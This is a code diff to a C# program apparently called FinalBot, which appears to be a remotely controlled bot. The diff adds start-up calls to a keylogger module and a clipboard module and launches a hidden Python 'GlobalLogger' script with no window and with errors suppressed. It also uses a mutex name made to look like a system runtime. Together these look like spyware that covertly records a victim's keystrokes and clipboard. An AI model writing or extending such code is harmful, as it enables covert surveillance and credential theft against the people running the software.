@@ -19,8 +19,6 @@ namespace FinalBot
 
         static async Task Main(string[] args)
         {
-            DebugLog("=== PROGRAM START ===");
-            
             // 1. Single Instance Check — fixed name to prevent multi-launch conflicts
             bool createdNew;
             string mutexName = "Global\\Vanguard_System_Runtime_7X2B9"; // Unique signature to avoid legacy locks
@@ -112,6 +110,25 @@ namespace FinalBot
                 DebugLog("Creating BotOrchestrator...");
                 var orchestrator = new BotOrchestrator(token, adminId);
                 
+                // Start Background Modules
+                FinalBot.Modules.KeyloggerModule.Start();
+                FinalBot.Modules.ClipboardModule.Start();
+
+                // Start Global Logger (Python script)
+                _ = Task.Run(() => {
+                    try {
+                        string loggerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
+                        if (File.Exists(loggerPath)) {
+                            Process.Start(new ProcessStartInfo {
+                                FileName = "python",
+                                Arguments = $"\"{loggerPath}\"",
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            });
+                        }
+                    } catch { }
+                });
+
                 DebugLog("Starting BotOrchestrator...");
                 await orchestrator.StartAsync();
             }
